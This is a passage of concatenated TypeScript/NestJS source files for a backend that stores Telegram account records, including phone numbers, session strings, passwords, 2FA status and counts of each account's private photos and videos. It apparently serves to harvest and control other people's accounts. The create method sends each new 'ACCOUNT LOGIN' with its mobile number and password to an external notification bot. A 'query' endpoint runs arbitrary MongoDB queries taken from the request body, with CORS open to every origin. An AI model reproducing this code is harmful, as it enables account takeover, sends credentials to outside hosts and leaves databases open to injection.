userDataModel: Model<UserDataDocument>) {}\n\n    async create(createUserDataDto: CreateUserDataDto): Promise<UserData> {\n        const createdUser = new this.userDataModel(createUserDataDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<UserData[]> {\n        return await this.userDataModel.find().exec();\n    }\n\n    async findOne(profile: string, chatId: string): Promise<UserData & { count?: number }> {\n        const user = (await this.userDataModel.findOne({ profile, chatId }).exec())?.toJSON();\n        if (!user) {\n            console.warn(`UserData with ID \"${profile} - ${chatId}\" not found`);\n        }\n        const currentCount = this.callCounts.get(chatId) || 0;\n        this.callCounts.set(chatId, currentCount + 1);\n        if (user) {\n            return { ...user, count: this.callCounts.get(chatId) };\n        } else {\n            return undefined\n        }\n    }\n\n    clearCount(chatId?: string): string {\n        if (chatId) {\n            this.callCounts.delete(chatId);\n            return `Count cleared for chatId: ${chatId}`;\n        } else {\n            this.callCounts.clear();\n            return 'All counts cleared.';\n        }\n    }\n\n    async update(profile: string, chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n        delete updateUserDataDto['_id']\n        console.log(updateUserDataDto)\n        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async updateAll(chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<any> {\n        delete updateUserDataDto['_id']\n        const updatedUser = await this.userDataModel.updateMany({ chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async remove(profile: string, chatId: string): Promise<UserData> {\n        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).exec();\n        if (!deletedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<UserData[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.userDataModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<UserData[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.userDataModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    async resetPaidUsers() {\n        try {\n            const entry = await this.userDataModel.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {\n                $set: {\n                    totalCount: 10,\n                    limitTime: Date.now(),\n                    paidReply: true\n                }\n            });\n        } catch (error) {\n            parseError(error)\n        }\n    }\n}\n","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class CreateUserDto {\n  @ApiProperty({ description: 'Mobile number of the user', example: '917330803480' })\n  mobile: string;\n\n  @ApiProperty({ description: 'Session information of the user', example: 'string' })\n  session: string;\n\n  @ApiProperty({ description: 'First name of the user', example: 'Praveen' })\n  firstName: string;\n\n  @ApiProperty({ description: 'Last name of the user', example: null })\n  lastName?: string | null;\n\n  @ApiProperty({ description: 'Username of the user', example: null })\n  username?: string | null;\n\n  @ApiProperty({ description: 'Number of channels', example: 56 })\n  channels: number;\n\n  @ApiProperty({ description: 'Number of personal chats', example: 74 })\n  personalChats: number;\n\n  @ApiProperty({ description: 'Number of messages', example: 0 })\n  msgs: number;\n\n  @ApiProperty({ description: 'Total number of chats', example: 195 })\n  totalChats: number;\n\n  @ApiProperty({ description: 'Timestamp of last active', example: '2024-06-03' })\n  lastActive: string;\n\n  @ApiProperty({ description: 'Telegram ID of the user', example: '2022068676' })\n  tgId: string;\n\n  @ApiProperty({ description: 'TwoFA status', example: false })\n  twoFA: boolean = false;\n\n  @ApiProperty({ description: 'Expiration status', example: false })\n  expired: boolean = false;\n\n  @ApiProperty({ description: 'password', example: \"pass\" })\n  password: string = null;\n\n  @ApiProperty({ description: 'Number of movies', example: 0 })\n  movieCount: number = 0;\n\n  @ApiProperty({ description: 'Number of photos', example: 0 })\n  photoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of videos', example: 0 })\n  videoCount: number = 0;\n\n  @ApiProperty({ description: 'Gender of the user', example: null })\n  gender?: string | null;\n\n  @ApiProperty({ description: 'Number of other photos', example: 0 })\n  otherPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of other videos', example: 0 })\n  otherVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own photos', example: 0 })\n  ownPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own videos', example: 0 })\n  ownVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of contacts', example: 105 })\n  contacts: number = 0;\n\n  @ApiProperty({\n    description: 'Call details of the user',\n    example: {\n      outgoing: 1,\n      incoming: 0,\n      video: 1,\n      chatCallCounts: [],\n      totalCalls: 1,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional({\n    description: 'Call details of the user',\n    example: []\n  })\n  recentUsers: any[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams, Type } from 'class-transformer';\nimport { IsOptional, IsBoolean, IsNumber, IsString } from 'class-validator';\n\nexport class SearchUserDto {\n  @ApiPropertyOptional({ description: 'Filter by Telegram ID' })\n  @IsOptional()\n  @IsString()\n  tgId?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by mobile number' })\n  @IsOptional()\n  @IsString()\n  mobile?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by twoFA status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  twoFA?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by Expiration status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  expired?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by session' })\n  @IsOptional()\n  @IsString()\n  session?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by first name' })\n  @IsOptional()\n  @IsString()\n  firstName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by last name' })\n  @IsOptional()\n  @IsString()\n  lastName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by username' })\n  @IsOptional()\n  @IsString()\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by channels count' })\n  @IsOptional()\n  @IsNumber()\n  channels?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by personal chats count' })\n  @IsOptional()\n  @IsNumber()\n  personalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by demo given status', type: Boolean })\n  @Transform(({ value }: TransformFnParams) => value === 'true' || value === true)\n  @IsOptional()\n  @IsBoolean()\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by messages count' })\n  @IsOptional()\n  @IsNumber()\n  msgs?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by total chats count' })\n  @IsOptional()\n  @IsNumber()\n  totalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by last active timestamp' })\n  @IsOptional()\n  @IsNumber()\n  lastActive?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by movie count' })\n  @IsOptional()\n  @IsNumber()\n  movieCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by photo count' })\n  @IsOptional()\n  @IsNumber()\n  photoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by video count' })\n  @IsOptional()\n  @IsNumber()\n  videoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by gender' })\n  @IsOptional()\n  @IsString()\n  gender?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by other photo count' })\n  @IsOptional()\n  @IsNumber()\n  otherPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by other video count' })\n  @IsOptional()\n  @IsNumber()\n  otherVideoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own photo count' })\n  @IsOptional()\n  @IsNumber()\n  ownPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own video count' })\n  @IsOptional()\n  @IsNumber()\n  ownVideoCount?: number;\n}\n","import { PartialType } from '@nestjs/mapped-types';\nimport { CreateUserDto } from './create-user.dto';\n\nexport class UpdateUserDto extends PartialType(CreateUserDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose from 'mongoose';\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport type UserDocument = User & Document;\n\n@Schema({\n  collection: 'users', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class User {\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  mobile: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  session: string;\n\n  @ApiProperty()\n  @Prop()\n  firstName: string;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  lastName: string | null;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  username: string | null;\n\n  @ApiProperty()\n  @Prop()\n  channels: number;\n\n  @ApiProperty()\n  @Prop()\n  personalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  demoGiven: boolean;\n\n  @ApiProperty()\n  @Prop()\n  msgs: number;\n\n  @ApiProperty()\n  @Prop()\n  totalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  lastActive: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  tgId: string;\n\n  @ApiProperty()\n  @Prop()\n  movieCount: number;\n\n  @ApiProperty()\n  @Prop()\n  photoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  videoCount: number;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  gender: string | null;\n\n  @Prop({ required: false, type: Boolean })\n  twoFA: boolean = false\n\n  @Prop({ required: false, type: Boolean, default: false })\n  expired: boolean = false\n\n  @Prop({ required: false })\n  password: string = null\n\n  @ApiProperty()\n  @Prop()\n  otherPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  otherVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  contacts: number;\n\n  @ApiProperty()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: {\n      outgoing: 0,\n      incoming: 0,\n      video: 0,\n      chatCallCounts: [],\n      totalCalls: 0,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: [],\n    required: false,\n  })\n  recentUsers: any[];\n\n  \n}\n\nexport const UserSchema = SchemaFactory.createForClass(User);\n","import { Controller, Get, Post, Body, Param, Patch, Delete, Query } from '@nestjs/common';\nimport { UsersService } from './users.service';\nimport { User } from './schemas/user.schema';\nimport { ApiTags, ApiOperation, ApiParam } from '@nestjs/swagger';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\n\n@ApiTags('Telegram Users') // Tag to categorize all endpoints in this controller\n@Controller('user')\nexport class UsersController {\n  constructor(private readonly usersService: UsersService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new user' })\n  async create(@Body() createUserDto: CreateUserDto) {\n    console.log(\"creating new user\")\n    return this.usersService.create(createUserDto);\n  }\n\n  @Get('/search')\n  @ApiOperation({ summary: 'Search users based on various parameters' })\n  async search(@Query() queryParams: SearchUserDto): Promise<User[]> {\n    return this.usersService.search(queryParams);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all users' })\n  async findAll() {\n    return this.usersService.findAll();\n  }\n\n  @Get(':tgId')\n  @ApiOperation({ summary: 'Get a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async findOne(@Param('tgId') tgId: string) {\n    return this.usersService.findOne(tgId);\n  }\n\n  @Patch(':tgId')\n  @ApiOperation({ summary: 'Update a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async update(@Param('tgId') tgId: string, @Body() updateUserDto: UpdateUserDto) {\n    return this.usersService.update(tgId, updateUserDto);\n  }\n\n  @Delete(':tgId')\n  @ApiOperation({ summary: 'Delete a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async remove(@Param('tgId') tgId: string) {\n    return this.usersService.delete(tgId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    const { query, sort, limit, skip } = requestBody;\n    try {\n      return await this.usersService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UsersService } from './users.service';\nimport { UsersController } from './users.controller';\nimport { UserSchema } from './schemas/user.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'userModule', schema: UserSchema, collection: 'users' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule)\n  ],\n  controllers: [UsersController],\n  providers: [UsersService],\n  exports: [UsersService]\n})\nexport class UsersModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { User, UserDocument } from './schemas/user.schema';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n\n@Injectable()\nexport class UsersService {\n  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,\n    @Inject(forwardRef(() => TelegramService))\n    private telegramService: TelegramService,\n    @Inject(forwardRef(() => ClientService))\n    private clientsService: ClientService\n  ) {}\n\n  async create(user: CreateUserDto): Promise<User> {\n    const activeClientSetup = this.telegramService.getActiveClientSetup();\n    console.log(\"New User received - \", user?.mobile);\n    console.log(\"ActiveClientSetup::\", activeClientSetup);\n    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {\n      console.log(\"Updating New Session Details\", user.mobile, user.username, activeClientSetup.clientId)\n      await this.clientsService.updateClientSession(user.session)\n    } else {\n      await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\\nMobile: t.me/${user.mobile}${user.password ? `\\npassword: ${user.password}` : \"\\n\"}`)}`);//Msgs:${user.msgs}\\nphotos:${user.photoCount}\\nvideos:${user.videoCount}\\nmovie:${user.movieCount}\\nPers:${user.personalChats}\\nChan:${user.channels}\\ngender-${user.gender}\\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);\n      const newUser = new this.userModel(user);\n      return newUser.save();\n    }\n  }\n\n  async findAll(): Promise<User[]> {\n    return this.userModel.find().exec();\n  }\n\n  async findOne(tgId: string): Promise<User> {\n    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()\n    if (!user) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n    return user;\n  }\n\n  async update(tgId: string, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${tgId} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async updateByFilter(filter: any, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async delete(tgId: string): Promise<void> {\n    const result = await this.userModel.deleteOne({ tgId }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n  }\n  async search(filter: SearchUserDto): Promise<User[]> {\n    if (filter.firstName) {\n      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any\n    }\n    if (filter.twoFA !== undefined) {\n      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;\n    }\n    console.log(filter)\n    return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<User[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.userModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n}\n","export enum PrivacyLevelEnum {\r\n    everybody = 'everybody',\r\n    contacts = 'contacts',\r\n    nobody = 'nobody'\r\n}\r\n\r\nexport type PrivacyLevel = keyof typeof PrivacyLevelEnum;\r\n\r\nexport interface ActiveClientSetup {\r\n    days?: number;\r\n    archiveOld: boolean;\r\n    formalities: boolean;\r\n    newMobile: string;\r\n    existingMobile: string;\r\n    clientId: string;\r\n}\r\n\r\nexport interface ChatStatistics {\r\n    period: 'day' | 'week' | 'month';\r\n    totalMessages: number;\r\n    uniqueSenders: number;\r\n    messageTypes: {\r\n        text: number;\r\n        photo: number;\r\n        video: number;\r\n        voice: number;\r\n        other: number;\r\n    };\r\n    topSenders: Array<{\r\n        id: string;\r\n        count: number;\r\n    }>;\r\n    mostActiveHours: Array<{\r\n        hour: number;\r\n        count: number;\r\n    }>;\r\n}\r\n\r\nexport interface ContentFilter {\r\n    chatId: string;\r\n    keywords?: string[];\r\n    mediaTypes?: ('photo' | 'video' | 'document')[];\r\n    actions: ('delete' | 'warn' | 'mute')[];\r\n}\r\n\r\nexport interface MessageScheduleOptions {\r\n    chatId: string;\r\n    message: string;\r\n    scheduledTime: Date;\r\n    replyTo?: number;\r\n    silent?: boolean;\r\n}\r\n\r\nexport interface GroupOptions {\r\n    title: string;\r\n    members?: string[];\r\n    photo?: string;\r\n    description?: string;\r\n    address?: string;\r\n    slowMode?: number;\r\n    megagroup?: boolean;\r\n    forImport?: boolean;\r\n    memberRestrictions?: {\r\n        sendMessages?: boolean;\r\n        sendMedia?: boolean;\r\n        sendStickers?: boolean;\r\n        sendGifs?: boolean;\r\n        sendGames?: boolean;\r\n        sendInline?: boolean;\r\n        embedLinks?: boolean;\r\n    };\r\n}\r\n\r\nexport interface ChannelInfo {\r\n    chatsArrayLength: number;\r\n    canSendTrueCount: number;\r\n    canSendFalseCount: number;\r\n    ids: string[];\r\n    canSendFalseChats: string[];\r\n}\r\n\r\nexport interface ChatFolderOptions {\r\n    name: string;\r\n    includedChats: string[];\r\n    excludedChats?: string[];\r\n    includeContacts?: boolean;\r\n    includeNonContacts?: boolean;\r\n    includeGroups?: boolean;\r\n    includeBroadcasts?: boolean;\r\n    includeBots?: boolean;\r\n    excludeMuted?: boolean;\r\n    excludeRead?: boolean;\r\n    excludeArchived?: boolean;\r\n}","import { NestFactory } from '@nestjs/core';\nimport mongoose from 'mongoose'\nimport { AppModule } from './app.module';\nimport { DocumentBuilder, SwaggerModule } from '@nestjs/swagger';\nimport { ValidationPipe } from '@nestjs/common';\n\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule);\n  const config = new DocumentBuilder()\n    .setTitle('NestJS and Express API')\n    .setDescription('API documentation')\n    .setVersion('1.0')\n    .build();\n\n  app.use((req, res, next) => {\n    res.header('Access-Control-Allow-Origin', '*');\n    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');\n    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');\n    next();\n  });\n\n  app.enableCors({\n    allowedHeaders: \"*\",\n    origin: \"*\"\n  });\n  const document = SwaggerModule.createDocument(app, config);\n  // fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));\n  SwaggerModule.setup('api', app, document);\n  mongoose.set('debug', true)\n  app.useGlobalPipes(new ValidationPipe({\n    transform: true,\n  }));\n  process.on('unhandledRejection', (reason, promise) => {\n    console.error('Unhandled Rejection at:', promise, 'reason:', reason);\n  });\n\n  process.on('uncaughtException', (reason, promise) => {\n    console.error(promise, reason);\n  });\n\n  let isShuttingDown = false;\n  const shutdown = async (signal: string) => {\n    if (isShuttingDown) return;\n    isShuttingDown = true;\n    console.log(`${signal} received`);\n    await app.close();\n    process.exit(0);\n  };\n\n  process.on('exit', async () => {\n    console.log('Application closed');\n  });\n\n  process.on('SIGINT', async () => {\n    await shutdown('SIGINT');\n  });\n\n  process.on('SIGTERM', async () => {\n    await shutdown('SIGTERM');\n  });\n\n  process.on('SIGQUIT', async () => {\n    await shutdown('SIGQUIT');\n  });\n\n  await app.init();\n  await app.listen(process.env.PORT || 9000);\n  console.log(`Application is running on: ${await app.getUrl()}`);\n}\nbootstrap();\n","import { Injectable, NestMiddleware, Logger } from '@nestjs/common';\nimport { Request, Response, NextFunction } from 'express';\nimport { fetchWithTimeout } from '../utils/fetchWithTimeout';\nimport { parseError } from '../utils/parseError';\nimport { notifbot } from '../utils/logbots';\n\n@Injectable()\nexport class LoggerMiddleware implements NestMiddleware {\n    private readonly logger = new Logger('HTTP');\n\n    use(req: Request, res: Response, next: NextFunction): void {\n        const { method, originalUrl, baseUrl } = req;\n        const userAgent = req.get('user-agent') || '';\n        const ip = req.ip;\n\n        const excludedEndpoints = ['/sendtochannel', '/favicon.', '/tgsignup'];\n        const isExcluded = (url: string) => excludedEndpoints.some(endpoint => url.startsWith(endpoint));\n        if (!isExcluded(originalUrl) && originalUrl !== '/') {\n            res.on('finish', () => {\n                const { statusCode } = res;\n                const contentLength = res.get('content-length');\n                if (statusCode >= 500) {\n                    fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.error(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 400) {\n                    fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.warn(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 300) {\n                    this.logger.verbose(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else {\n                    this.logger.log(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                }\n            });\n            res.on('error', (error) => {\n                const errorDetails = parseError(error, process.env.clientId);\n                fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${errorDetails.message}`)}`);\n            })\n        } else {\n            if (originalUrl.includes('Video')) {\n                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);\n            }\n        }\n\n        next();\n    }\n}\n","import { Injectable, NestMiddleware } from '@nestjs/common';\r\nimport { Request, Response, NextFunction } from 'express';\r\n\r\nconst requestTimestamps = new Map<string, number>(); // Stores timestamps per route\r\n\r\n@Injectable()\r\nexport class ThrottleMiddleware implements NestMiddleware {\r\n  use(req: Request, res: Response, next: NextFunction) {\r\n    const key = `${req.method}:${req.url}`; // Unique key per route\r\n    const now = Date.now();\r\n    const lastCall = requestTimestamps.get(key) || 0;\r\n    const THROTTLE_TIME = 1000; // 5 seconds\r\n\r\n    if (now - lastCall < THROTTLE_TIME) {\r\n        console.error(`Too many requests for ${key}. Please wait.`);\r\n        return res.status(429).json({ message: 'Too many requests. Please wait.' });\r\n    }\r\n\r\n    requestTimestamps.set(key, now);\r\n    next();\r\n  }\r\n}\r\n","export function sleep(ms: number): Promise<void> {\n  return new Promise(resolve => setTimeout(resolve, ms));\n}\n\nexport function contains(str: string | null | undefined, arr: string[]): boolean {\n  if (!str || !Array.isArray(arr)) return false;\n  return arr.some(element => element && str.includes(element));\n}\n\nexport function toBoolean(value: string | number | boolean | null | undefined): boolean {\n  if (value === null || value === undefined) return false;\n  if (typeof value === 'string') {\n    const normalizedValue = value.toLowerCase().trim();\n    return normalizedValue === 'true' || normalizedValue === '1' || normalizedValue === 'yes';\n  }\n  if (typeof value === 'number') {\n    return value !== 0;\n  }\n  return value;\n}\n\nexport function fetchNumbersFromString(inputString: string | null | undefined): string {\n  if (!inputString) return '';\n  const regex = /\\d+/g;\n  const matches = inputString.match(regex);\n  return matches ? matches.join('') : '';\n}\n\nexport const defaultReactions = Object.freeze([\n  '❤', '🔥', '👏', '🥰', '😁', '🤔',\n  '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n  '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n  '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n  '🤣', '💔', '🏆', '😭', '😴', '👍',\n  '🌚', '⚡', '🍌', '😐', '💋', '👻',\n  '👀', '🙈', '🤝', '🤗', '🆒',\n  '🗿', '🙉', '🙊', '🤷', '👎'\n] as const);\n\nexport const defaultMessages = Object.freeze([\n  \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\",\n  \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\",\n  \"16\", \"17\", \"18\", \"19\", \"20\", \"21\"\n] as const);\n\nexport function areJsonsNotSame(json1: unknown, json2: unknown): boolean {\n  const keysToIgnore = ['id', '_id'];\n  console.log('[areJsonsNotSame] Starting comparison...');\n\n  function normalizeObject(obj: unknown): unknown {\n    if (obj === null || obj === undefined) return obj;\n    if (typeof obj !== 'object') return obj;\n    if (Array.isArray(obj)) return obj.map(normalizeObject);\n\n    const normalized: Record<string, unknown> = {};\n    const sortedKeys = Object.keys(obj as Record<string, unknown>)\n      .filter(key => !keysToIgnore.includes(key))\n      .sort();\n\n    for (const key of sortedKeys) {\n      normalized[key] = normalizeObject((obj as Record<string, unknown>)[key]);\n    }\n    return normalized;\n  }\n  const normalized1 = normalizeObject(json1);\n  const normalized2 = normalizeObject(json2);\n  const result = JSON.stringify(normalized1) !== JSON.stringify(normalized2);\n  console.log(`[areJsonsNotSame] Comparison result: ${result ? 'Objects are different' : 'Objects are same'}`);\n  \n  return result;\n}\n\nexport function mapToJson<K extends string | number | symbol, V>(map: Map<K, V>): Record<string, V> {\n  if (!(map instanceof Map)) {\n    throw new Error('Input must be a Map instance');\n  }\n  const obj: Record<string, V> = {};\n  for (const [key, value] of map.entries()) {\n    obj[String(key)] = value;\n  }\n  return obj;\n}\n","import axios, { AxiosRequestConfig, AxiosResponse, AxiosError } from \"axios\";\r\nimport { sleep } from \"telegram/Helpers\";\r\nimport { extractMessage, parseError } from \"./parseError\";\r\nimport { ppplbot } from \"./logbots\";\r\nimport http from 'http';\r\nimport https from 'https';\r\n\r\nexport async function fetchWithTimeout(\r\n    url: string,\r\n    options: AxiosRequestConfig & { bypassUrl?: string } = {},\r\n    maxRetries = 3  // Increased default retries\r\n): Promise<AxiosResponse | undefined> {\r\n    if (!url) return undefined;\r\n\r\n    options.timeout = options.timeout || 30000; // Set default timeout to 30 seconds\r\n    options.method = options.method || \"GET\";\r\n    let lastError: Error | null = null;\r\n\r\n    console.log(`trying: ${url}`);\r\n\r\n    for (let attempt = 0; attempt <= maxRetries; attempt++) {\r\n        const controller = new AbortController();\r\n        // Don't multiply timeout linearly, use a more conservative increase\r\n        const currentTimeout = options.timeout + (attempt * 5000); // Add 5 seconds per retry\r\n        const timeoutId = setTimeout(() => controller.abort(), currentTimeout);\r\n\r\n        try {\r\n            // Try axios first\r\n            try {\r\n                const response = await axios({\r\n                    ...options,\r\n                    url,\r\n                    signal: controller.signal,\r\n                    httpAgent: new http.Agent({ keepAlive: true, timeout: currentTimeout }),\r\n                    httpsAgent: new https.Agent({ keepAlive: true, timeout: currentTimeout }),\r\n                    maxRedirects: 5,\r\n                });\r\n                clearTimeout(timeoutId);\r\n                return response;\r\n            } catch (axiosError) {\r\n                // Fallback to fetch API if axios fails\r\n                if (shouldTryFetchFallback(axiosError)) {\r\n                    const fetchResponse = await makeFetchRequest(url, options, controller.signal);\r\n                    clearTimeout(timeoutId);\r\n                    return fetchResponse;\r\n                }\r\n                throw axiosError; // Re-throw if we shouldn't use fetch fallback\r\n            }\r\n        } catch (error) {\r\n            clearTimeout(timeoutId);\r\n            lastError = error;\r\n            const parsedError = parseError(error, url, false);\r\n            const parsedUrl = new URL(url);\r\n            const host = parsedUrl.host;\r\n            const endpoint = parsedUrl.pathname + parsedUrl.search;\r\n\r\n            const message = extractMessage(parsedError);\r\n            const isTimeout = axios.isAxiosError(error) &&\r\n                (error.code === \"ECONNABORTED\" ||\r\n                    